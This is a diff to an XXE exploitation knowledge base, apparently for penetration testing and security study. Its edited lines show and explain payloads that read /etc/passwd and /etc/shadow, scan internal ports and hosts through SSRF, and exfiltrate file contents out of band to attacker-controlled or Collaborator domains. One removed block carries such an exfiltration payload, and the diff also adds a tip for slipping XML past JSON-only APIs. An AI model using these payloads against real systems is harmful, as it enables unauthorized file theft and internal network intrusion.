@@ -1,8 +1,8 @@
----
-title: XXE Exploitation Knowledge Base
+-----
+
+## title: XXE Exploitation Knowledge Base
 excerpt: XXE attack taxonomy, parser behaviour, exploitation model, identification, LFI, SSRF/OOB, error-based, blind XXE, SOAP, file upload, XInclude, PHP wrappers, Java protocols and advanced DTD techniques.
 tags: XXE, XML, SSRF, LFI, OOB, DTD, Blind XXE, SOAP
----
 
 # XML Fundamentals
 
@@ -84,7 +84,7 @@ Parameter entities are a special type of entity that can only be used inside DTD
 <!ENTITY % filename SYSTEM "file:///etc/passwd">
 ```
 
-And they are referenced with `%name;` instead of `&name;`:
+And they are referenced with `%filename;` instead of `&name;`:
 
 ```xml
 %filename;
@@ -113,7 +113,10 @@ Many legacy and modern applications rely on the XML format to consume, store and
 ## What is it
 
 An XML External Entity attack is a type of attack against an application that parses non-validated XML input. This attack occurs when XML input containing a reference to an external entity is processed by a weakly configured XML parser. These external entities are defined by the attacker and they can lead to several side effects like data exfiltration, Server-Side Request Forgery (SSRF), denial of service or even, in very specific scenarios, Remote Code Execution (RCE).
-**Example of internal entity**:
+
+To understand the difference between a harmless entity and a dangerous one, compare these two examples:
+
+**Internal entity (harmless):**
 
 ```XML
 <!--?xml version="1.0" ?-->
@@ -124,9 +127,9 @@ An XML External Entity attack is a type of attack against an application that pa
  </userInfo>
 ```
 
-In this example the attacker is defining the entity “example”, assigning the value “Doe” to it and then reflecting it in the “lastName” element.
+Here the attacker is defining the entity “example”, assigning the value “Doe” to it and then reflecting it in the “lastName” element. Nothing leaves the server.
 
-**Example of external entity**:
+**External entity (dangerous):**
 
 ```XML
 <!--?xml version="1.0" ?-->
@@ -137,7 +140,7 @@ In this example the attacker is defining the entity “example”, assigning the
  </userInfo>
 ```
 
-In this example the attacker is defining “example” and assigning the content of “/etc/passwd” as the value. In an ideal situation the content of the file will be printed.
+Here the attacker is defining “example” and assigning the content of “/etc/passwd” as the value. In an ideal situation the content of the file will be printed in the response. If the application does not return the content directly, other exfiltration techniques covered later in this KB can be used.
 
 ## Requirements
 
@@ -209,6 +212,7 @@ The [XML Fundamentals](#xml-fundamentals) section explains what entities are and
 As covered in the fundamentals, the parser resolves entities by fetching whatever resource the `SYSTEM` identifier points to. But what happens when the fetched content causes problems?
 
 - If the file contains characters that are special in XML (`<`, `>`, `&`) the parser throws an error because the substituted content breaks the XML structure. This is why techniques like base64 encoding (php://filter) and error-based exfiltration exist — they work around this limitation.
+- If the target file is binary (a compiled library, an image, a .jar archive) the parser will either fail or return garbled content. This is another reason why encoding wrappers like `php://filter/convert.base64-encode` are useful — they convert binary content to safe ASCII before the parser tries to process it.
 - If the entity points to an HTTP URL, the parser makes an actual HTTP request to that URL. The response body replaces the entity. This is the foundation of both SSRF and OOB exfiltration.
 - If the entity points to a resource that does not exist, the parser generates an error message that often includes the path it tried to resolve. Attackers exploit this behavior to leak data through error messages.
 
@@ -355,7 +359,6 @@ graph LR
     DOS[DENIAL OF SERVICE]
     DOS --> DOS1[Billion Laughs\nrecursive expansion]
     DOS --> DOS2[Quadratic Blowup\nrepeated references]
-
 ```
 
 -----
@@ -375,6 +378,8 @@ Before diving into payloads, it helps to know when XXE testing is worth prioriti
 - Any legacy enterprise system that predates JSON adoption
 
 If the target matches any of these patterns and especially if it runs Java, it is worth spending time on XXE testing.
+
+**Tip:** If the API only accepts JSON, do not give up immediately. Try sending an XML payload with `Content-Type: application/json` — some frameworks parse the body based on content rather than the declared content-type. This technique is covered in [Content-Type Switching](#content-type-switching).
 
 ## Testing on REST APIs
 
@@ -419,7 +424,7 @@ But if the response does not return anything or it does not contain the expected
 <!DOCTYPE replace [<!ENTITY xxe SYSTEM "sdjsd:///etc/passwd"> ]>
 <contacts>
   <contact>
-    <n>Jean &xxe; Dupont</n>
+    <name>Jean &xxe; Dupont</name>
     <phone>00 11 22 33 44</phone>
     <address>42 rue du CTF</address>
     <zipcode>75000</zipcode>
@@ -439,7 +444,7 @@ Additionally, we can also trigger errors by malforming the resource declaration 
 <!DOCTYPE replace [<!ENTITY xxe SYSTEM "http:/Attacker server"> ]>
 <contacts>
   <contact>
-    <n>Jean &xxe; Dupont</n>
+    <name>Jean &xxe; Dupont</name>
     <phone>00 11 22 33 44</phone>
     <address>42 rue du CTF</address>
     <zipcode>75000</zipcode>
@@ -579,7 +584,7 @@ In this payload, the entity “xxe” will return the content of the file `/etc/
 
 ```xml
 <!ENTITY xxe SYSTEM "file:///etc/passwd">          <!-- User accounts -->
-<!ENTITY xxe SYSTEM "file:///etc/shadow">          <!-- Password hashes (requires root) -->
+<!ENTITY xxe SYSTEM "file:///etc/shadow">          <!-- Password hashes (requires root — rarely readable) -->
 <!ENTITY xxe SYSTEM "file:///etc/hosts">           <!-- Hostname mappings -->
 <!ENTITY xxe SYSTEM "file:///etc/hostname">        <!-- System hostname -->
 <!ENTITY xxe SYSTEM "file:///proc/self/environ">   <!-- Environment variables -->
@@ -622,6 +627,8 @@ Some notes on Windows paths: use forward slashes even on Windows (`file:///C:/pa
 
 Server-Side Request Forgery (SSRF) is a web security vulnerability that allows an attacker to induce the server-side application to make requests to unintended locations. This can lead to unauthorized actions or access to data within the organization and provides the attacker with the ability of fingerprinting other services running internally.
 
+The basic SSRF payload makes the parser request an internal URL:
+
 ```xml
 <?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE foo [
@@ -630,13 +637,37 @@ Server-Side Request Forgery (SSRF) is a web security vulnerability that allows a
 <foo>&xxe;</foo>
 ```
 
+If the entity content is reflected in the response, the attacker can read the response from internal services. This turns XXE into a proxy for accessing services that are not exposed to the internet.
+
+### Internal Service Discovery
+
+SSRF through XXE is not limited to reading a single URL. By varying the port and host in the entity declaration, attackers can map out the internal network:
+
+```xml
+<!-- Port scanning common services -->
+<!ENTITY xxe SYSTEM "http://127.0.0.1:80/">      <!-- HTTP -->
+<!ENTITY xxe SYSTEM "http://127.0.0.1:443/">     <!-- HTTPS -->
+<!ENTITY xxe SYSTEM "http://127.0.0.1:8080/">    <!-- Alt HTTP / Tomcat -->
+<!ENTITY xxe SYSTEM "http://127.0.0.1:8443/">    <!-- Alt HTTPS -->
+<!ENTITY xxe SYSTEM "http://127.0.0.1:3306/">    <!-- MySQL -->
+<!ENTITY xxe SYSTEM "http://127.0.0.1:5432/">    <!-- PostgreSQL -->
+<!ENTITY xxe SYSTEM "http://127.0.0.1:6379/">    <!-- Redis -->
+<!ENTITY xxe SYSTEM "http://127.0.0.1:9200/">    <!-- Elasticsearch -->
+<!ENTITY xxe SYSTEM "http://127.0.0.1:27017/">   <!-- MongoDB -->
+
+<!-- Scanning internal network hosts -->
+<!ENTITY xxe SYSTEM "http://192.168.1.1/">
+<!ENTITY xxe SYSTEM "http://10.0.0.1/">
+<!ENTITY xxe SYSTEM "http://172.16.0.1/">
+```
+
+The parser behavior reveals information about the target: a connection refused error means the port is closed, a timeout suggests a firewall is filtering traffic, and actual content in the response confirms the service is running and accessible. Even when the response is not reflected directly, timing differences between open and closed ports can confirm which services are running.
+
 ## Out-of-Band (OOB) Exfiltration via Malicious DTDs
 
 Up to this point, all techniques assume the server sends back the file content or error message in its response. But what happens when the application does not return anything useful? The response is a generic 200 OK or blank page, and nothing we inject shows up anywhere. This is called **blind XXE** — the vulnerability exists but we cannot see the output directly.
 
 The solution is to make the server send the data somewhere else — to a server we control. This is the “out-of-band” part: instead of reading the data in the response, we receive it on a separate channel. The XML parser’s ability to fetch external resources works in our favor here because we can make it send HTTP requests that contain the stolen data in the URL.
-
-**Key Concept:** The parser processes the XML input and resolves entities. If an entity points to an external resource (HTTP, HTTPS, or even FTP), the parser will attempt to fetch it. We exploit this behavior to send data out-of-band.
 
 The core idea is simple:
 
@@ -676,8 +707,6 @@ On the attacker machine, create a DTD file containing the malicious actions. In 
 - `%eval;` expands and defines `%exfiltrate`.
 - `%exfiltrate;` triggers the HTTP request to the attacker’s server, sending the file contents as part of the query string.
 
-**Why escape characters?** XML parsers enforce strict syntax rules. When nesting declarations, `%` must be escaped as `&#x25;` to avoid breaking the DTD structure.
-
 ### Step 2: Host the Malicious DTD
 
 Once the malicious DTD is created, host it on a server reachable by the target application. A simple Python HTTP server works:
@@ -709,16 +738,7 @@ Send an XML payload that loads the external DTD:
 
 ### Step 4: Monitor OOB Interaction
 
-Use Burp Collaborator or a custom HTTP listener to capture the incoming request. Burp Collaborator provides a unique domain that logs all interactions, making it easy to confirm exploitation.
-
-```XML
-<!ENTITY % file SYSTEM "file:///etc/passwd">
-<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://<your-collaborator-id>.oastify.com/?x=%file;'>">
-%eval;
-%exfiltrate;
-```
-
-When the parser processes this, you should see an HTTP request to your Collaborator domain with the contents of `/etc/passwd` in the query string.
+Use Burp Collaborator or a custom HTTP listener to capture the incoming request. Burp Collaborator provides a unique domain that logs all interactions, making it easy to confirm exploitation. When the parser processes the malicious DTD, you should see an HTTP request to your Collaborator domain with the contents of `/etc/passwd` in the query string.
 
 [What is a blind XXE attack? Tutorial & Examples | Web Security Academy](https://portswigger.net/web-security/xxe/blind)
 
@@ -726,7 +746,7 @@ When the parser processes this, you should see an HTTP request to your Collabora
 
 OOB exfiltration requires the server to make outbound HTTP connections to our server. But what if the firewall blocks all outbound traffic? In that case, data cannot leave the network through HTTP requests. However, there is another channel we can use: **error messages**.
 
-Many applications return error details when something goes wrong during XML parsing. If we can force the parser to include file contents inside an error message, we can read the data without any outbound connection. The trick is to make the parser try to access a non-existent file path that contains the stolen data — the error message will include the full path, revealing the file contents.
+Many applications return error details when something goes wrong during XML parsing. If we can force the parser to include file contents inside an error message, we can read the data without any outbound connection. The trick is to make the parser try to access a non-existent file path that contains the stolen data. When the parser fails to open `file:///nonexistent/<contents of /etc/passwd>`, it generates an error message that includes the full path it tried to resolve — and that path contains the file contents we want.
 
 For example, if the application returns error messages like these:
 
@@ -842,7 +862,7 @@ XLSX files are ZIP archives containing XML files. The attack involves extracting
 unzip document.xlsx -d xlsx_extracted/
 ```
 
-**Step 2:** Modify `xl/workbook.xml` or `xl/worksheets/sheet1.xml`:
+**Step 2:** Inject into the XML files inside the archive. The most common injection points are `xl/sharedStrings.xml` (shared string table used for cell values), `xl/worksheets/sheet1.xml` (individual worksheet data) and `[Content_Types].xml` (content type definitions). Here is an example injecting into the workbook:
 
 ```xml
 <?xml version="1.0" encoding="UTF-8"?>
@@ -1080,20 +1100,6 @@ Content-Type: application/json
 <root>&xxe;</root>
 ```
 
-### XML to JSON
-
-Some APIs accept XML but convert to JSON:
-
-```http
-POST /api/data HTTP/1.1
-Host: example.com
-Content-Type: application/xml
-
-{
-  "data": "<?xml version='1.0'?><![CDATA[<!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]><root>&xxe;</root>]]>"
-}
-```
-
 ### Testing strategy
 
 APIs with poor input validation might accept `text/xml`, `application/xml`, `application/json`, `text/plain` or even missing content-types with XML content. Try the XXE payload with various content-type headers, with null/missing headers, and with charset parameters (`application/xml; charset=utf-8`).
@@ -1187,6 +1193,8 @@ The key signal is whether `%name;` appears inside a markup declaration. If it do
 ```
 
 ### Common DTD Paths — Windows
+
+Windows DTD paths depend on the software installed on the server. Unlike Linux where many DTDs ship with the base system packages, Windows DTDs come from specific applications (Java, Office, database engines, etc). Not all of these will be present — it depends on what is installed:
 
 ```
 C:\Windows\System32\wbem\xml\cim20.dtd
@@ -1326,6 +1334,8 @@ Monitor DNS queries on `attacker.com` to capture data. Tools like `dnsdumpster` 
 %eval;
 %exfiltrate;
 ```
+
+Keep in mind that DNS has strict length limits: each label (subdomain component) can be at most 63 characters and the full domain name cannot exceed 253 characters. This means DNS exfiltration works best for short values (hostname, single config values, usernames) but not for large files. For longer content you would need to split the data into chunks and send multiple DNS queries, or combine this with other techniques.
 
 ## PHP Wrappers
 
@@ -1532,3 +1542,4 @@ unzip interactsh-client_1.0.0_linux_amd64.zip
 
 - **XML External Entity (XXE) Processing** - NIST Guidelines
 - **DTD Security Considerations** - W3C XML Specifications
+
